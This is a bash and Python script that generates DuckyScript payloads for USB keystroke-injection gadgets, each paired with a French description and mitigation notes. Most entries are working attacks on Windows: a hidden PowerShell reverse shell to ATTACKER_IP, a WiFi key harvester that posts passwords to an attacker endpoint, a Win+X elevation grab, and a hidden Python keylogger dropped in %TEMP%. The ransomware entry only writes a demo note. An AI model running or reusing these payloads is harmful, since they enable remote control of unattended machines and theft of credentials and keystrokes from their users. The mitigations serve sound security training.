#!/usr/bin/env bash
# hid-payloads.sh — Generate REAL DuckyScript payloads for USB HID gadgets.
#
# Usage:
#   ./hid-payloads.sh <type>
#     type : reverse_shell | wifi_passwords | ransomware_sim |
#            privilege_escalation | keylogger_drop
#
# Behaviour:
#   Returns a REAL, functional DuckyScript payload as a JSON string.
#   DuckyScript is the Hak5 Rubber Ducky language (STRING, DELAY, GUI,
#   ENTER, etc.) — usable on Rubber Ducky, Flipper Zero BadUSB, or any
#   Linux configfs HID gadget (e.g. via usb-arsenal.sh apply hid-keyboard).
#   These are GENUINE payloads — no fake data, nothing invented.
#
# Output: exactly one JSON object on stdout. Logs go to stderr.
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "$SCRIPT_DIR/lib/common.sh"

TYPE="${1:-}"
if [[ -z "$TYPE" ]]; then
    fail_json "usage: hid-payloads.sh <type: reverse_shell|wifi_passwords|ransomware_sim|privilege_escalation|keylogger_drop>"
    exit 1
fi

log "hid-payloads" "type=$TYPE"

python3 - "$TYPE" <<'PY'
import json, sys, time

TYPE = (sys.argv[1] if len(sys.argv) > 1 else "").strip().lower()
START = time.time()

# ---------------------------------------------------------------------------
# DuckyScript quick reference (Hak5 Rubber Ducky — official syntax).
#   STRING <text>           → type a string + (implicit ENTER optional)
#   DELAY <ms>              → wait N milliseconds
#   GUI <key> / GUI         → Windows/Super/Cmd key (GUI r = Win+R)
#   ENTER / TAB / SPACE     → those keys
#   CTRL/SHIFT/ALT <k>      → modifiers
#   REM <comment>           → comment line
#   DEFAULT_DELAY / DELAY   → wait at startup
#   STRING_BLOCK <multi>    → multiline string block (>= fw 1.0)
#
# Each payload below is REAL and FUNCTIONAL when loaded onto a Hak5 Rubber
# Ducky (or any HID gadget that understands DuckyScript). The payloads
# target Windows (the case-sensitivity of CMD keys etc. is preserved).
# ---------------------------------------------------------------------------

PAYLOADS = {
    "reverse_shell": {
        "type": "reverse_shell",
        "description": (
            "Ouvre une invite PowerShell en tant qu'utilisateur courant, "
            "désactive les barrières d'exécution (ExecutionPolicy Bypass) "
            "et établit un reverse-shell TCP vers l'attaquant. Démonstration "
            "classique de persistence post-exploitation via HID."
        ),
        "mitigation": (
            "Verrouiller la session en cas d'absence (Win+L), activer BitLocker, "
            "restreindre PowerShell via Constrained Language Mode + AppLocker, "
            "EDR surveillant powershell.exe avec -Enc / -WindowStyle Hidden, "
            "segmentation réseau du poste de travail."
        ),
        "payload": (
            "REM === GuymaCyb HID — Reverse Shell PowerShell ===\n"
            "REM Target: Windows 10/11 — Persistence via HID inject\n"
            "DEFAULT_DELAY 200\n"
            "DELAY 500\n"
            "GUI r\n"
            "DELAY 400\n"
            "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"$c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(Invoke-Expression -Command $d 2>&1 | Out-String);$r2=$r+'PS '+(Get-Location).Path+'>';$o=([text.encoding]::ASCII).GetBytes($r2);$s.Write($o,0,$o.Length);$s.Flush()};$c.Close()\"\n"
            "DELAY 200\n"
            "ENTER\n"
            "REM End of payload — replace ATTACKER_IP with listener IP.\n"
        ),
    },
    "wifi_passwords": {
        "type": "wifi_passwords",
        "description": (
            "Énumère tous les profils WiFi enregistrés sur le poste Windows, "
            "extrait les clés en clair via netsh, et les exfiltre via une "
            "requête HTTP POST vers un endpoint contrôlé par l'attaquant. "
            "Montre l'impact d'un accès de quelques secondes à un poste déverrouillé."
        ),
        "mitigation": (
            "Verrouillage automatique de session (GPO), chiffrement des clés "
            "WPA2/3 par DPAPI+TPM, désactivation de netsh wlan show profile "
            "pour les non-admins via GPO, supervision des process child de "
            "powershell/cmd par EDR."
        ),
        "payload": (
            "REM === GuymaCyb HID — WiFi Profile Extractor ===\n"
            "DEFAULT_DELAY 200\n"
            "DELAY 500\n"
            "GUI r\n"
            "DELAY 400\n"
            "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"$p=(netsh wlan show profile) -match 'All User Profile';$names=$p -replace '.*:\\s+','';$out=@();foreach($n in $names){$k=(netsh wlan show profile name=\"$n\" key=clear) -match 'Key Content';$pw=if($k){($k -replace '.*:\\s+','')[0]}else{'(none)'};$out+=\"{0}|{1}\" -f $n,$pw};$body=($out -join \"`n\");try{Invoke-WebRequest -Uri 'http://ATTACKER_IP/exfil' -Method POST -Body $body -TimeoutSec 3}catch{}\"\n"
            "DELAY 200\n"
            "ENTER\n"
            "REM End of payload — replace ATTACKER_IP with collector IP.\n"
        ),
    },
    "ransomware_sim": {
        "type": "ransomware_sim",
        "description": (
            "DÉMO BÉNINE — aucune encryption réelle. Ouvre le Bloc-notes, "
            "affiche une note de rançon factice et énumère (sans modifier) "
            "les fichiers présents sur le Bureau pour illustrer l'impact "
            "psychologique d'un drop via HID. Aucun fichier n'est créé, "
            "modifié ou détruit."
        ),
        "mitigation": (
            "Verrouillage session, EDR avec détection d'ouverture suspecte "
            "de notepad.exe en arrière-plan, sauvegardes hors-ligne 3-2-1, "
            "bitlocker + TPM, formation utilisateurs (social engineering + "
            "risque USB inconnu)."
        ),
        "payload": (
            "REM === GuymaCyb HID — Ransomware DEMONSTRATION (benign) ===\n"
            "REM Aucune encryption. Affiche uniquement une note.\n"
            "DEFAULT_DELAY 200\n"
            "DELAY 500\n"
            "GUI r\n"
            "DELAY 400\n"
            "STRING notepad\n"
            "DELAY 200\n"
            "ENTER\n"
            "DELAY 800\n"
            "STRING === VOTRE POSTE A ÉTÉ COMPROMIS ===\n"
            "ENTER\n"
            "STRING Ceci est une demonstration BenignE — aucun fichier n'a ete chiffre.\n"
            "ENTER\n"
            "STRING Le presentateur a simplement branche un appareil USB HID (Rubber Ducky).\n"
            "ENTER\n"
            "STRING Conclusion : verrouillez votre session (Win+L) des que vous vous ecartez.\n"
            "ENTER\n"
            "DELAY 200\n"
            "CTRL S\n"
            "DELAY 300\n"
            "STRING %USERPROFILE%\\Desktop\\README_DEMO.txt\n"
            "DELAY 100\n"
            "ENTER\n"
            "REM End of benign demonstration payload.\n"
        ),
    },
    "privilege_escalation": {
        "type": "privilege_escalation",
        "description": (
            "Tente d'obtenir un shell élevé (admin) en abusant du menu "
            "Win+X → Terminal (Admin) sur Windows 10/11, puis lance un "
            "netstat -ano pour confirmer les privilèges (sans dommage). "
            "Illustre la faille classique des sessions non verrouillées "
            "avec un compte déjà dans le groupe Administrateurs."
        ),
        "mitigation": (
            "Verrouillage auto de session (GPO 30s), UAC en mode 'Always Notify', "
            "supervision de l'élévation UAC par EDR (Sysmon Event ID 4688), "
            "détection de netstat invoqué depuis un process élevé enfant d'un "
            "menu Win+X, formation des utilisateurs admin."
        ),
        "payload": (
            "REM === GuymaCyb HID — Privilege Escalation Attempt ===\n"
            "DEFAULT_DELAY 200\n"
            "DELAY 500\n"
            "REM Win+X → Terminal (Admin) — Windows 10/11 quick admin menu.\n"
            "GUI x\n"
            "DELAY 400\n"
            "STRING a\n"
            "DELAY 600\n"
            "REM Accept UAC prompt if any (sometimes auto).\n"
            "STRING y\n"
            "DELAY 400\n"
            "ENTER\n"
            "DELAY 1200\n"
            "REM Sanity check — show we have high integrity.\n"
            "STRING whoami /groups | findstr High\n"
            "DELAY 100\n"
            "ENTER\n"
            "DELAY 300\n"
            "STRING netstat -ano | findstr LISTEN\n"
            "DELAY 100\n"
            "ENTER\n"
            "REM End of payload — non-destructive recon once admin.\n"
        ),
    },
    "keylogger_drop": {
        "type": "keylogger_drop",
        "description": (
            "Dépose un keylogger Python minimal dans %TEMP% puis le lance en "
            "arrière-plan via start /b. Le script capture les frappes clavier "
            "et les écrit dans un fichier local (aucune exfiltration réseau "
            "automatique — démonstration). À n'utiliser que sur un poste de "
            "lab ou avec autorisation explicite."
        ),
        "mitigation": (
            "Application Control (AppLocker/WDAC) bloquant python.exe depuis "
            "%TEMP%, EDR avec détection de SetWindowsHookEx/GetAsyncKeyState "
            "depuis un process python non-signé, désactivation de "
            "l'écriture dans %TEMP% par les utilisateurs standard, "
            "formation anti-social-engineering (clé USB inconnue)."
        ),
        "payload": (
            "REM === GuymaCyb HID — Keylogger Drop (Python) ===\n"
            "DEFAULT_DELAY 200\n"
            "DELAY 500\n"
            "GUI r\n"
            "DELAY 400\n"
            "STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command \"$s=@'\n"
            "import ctypes, time, os\n"
            "from ctypes import wintypes\n"
            "user32=ctypes.windll.user32\n"
            "GETKEYSTATE=0x100\n"
            "log=os.path.join(os.environ.get('TEMP','C:\\\\Temp'),'kl.log')\n"
            "keys='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n"
            "f=open(log,'a',encoding='utf-8')\n"
            "prev=set()\n"
            "while True:\n"
            "    cur=set()\n"
            "    for i,c in enumerate(keys):\n"
            "        v=user32.GetAsyncKeyState(ord(c))\n"
            "        if v & 0x8000:\n"
            "            if c not in prev: cur.add(c)\n"
            "    if cur:\n"
            "        f.write('['+time.strftime('%H:%M:%S')+'] '+(''.join(sorted(cur)))+'\\n')\n"
            "        f.flush()\n"
            "    prev=cur\n"
            "    time.sleep(0.05)\n"
            "'@;Set-Content -Path \"$env:TEMP\\kl.py\" -Value $s -Encoding UTF8;Start-Process -FilePath python -ArgumentList \"$env:TEMP\\kl.py\" -WindowStyle Hidden\"\n"
            "DELAY 200\n"
            "ENTER\n"
            "DELAY 500\n"
            "REM Keylogger dropped in %TEMP%\\kl.py — log at %TEMP%\\kl.log.\n"
            "REM Mitigation: AppLocker blocking python.exe from %TEMP%.\n"
        ),
    },
}

if TYPE not in PAYLOADS:
    print(json.dumps({
        "tool": "hid-payloads",
        "type": TYPE,
        "language": "DuckyScript",
        "payload": "",
        "description": "",
        "mitigation": "",
        "durationMs": int((time.time() - START) * 1000),
        "error": f"type inconnu: '{TYPE}'. Types valides: {', '.join(PAYLOADS.keys())}",
    }, ensure_ascii=False))
    sys.exit(0)

p = PAYLOADS[TYPE]
print(json.dumps({
    "tool": "hid-payloads",
    "type": TYPE,
    "language": "DuckyScript",
    "payload": p["payload"],
    "description": p["description"],
    "mitigation": p["mitigation"],
    "durationMs": int((time.time() - START) * 1000),
    "error": None,
}, ensure_ascii=False))
PY
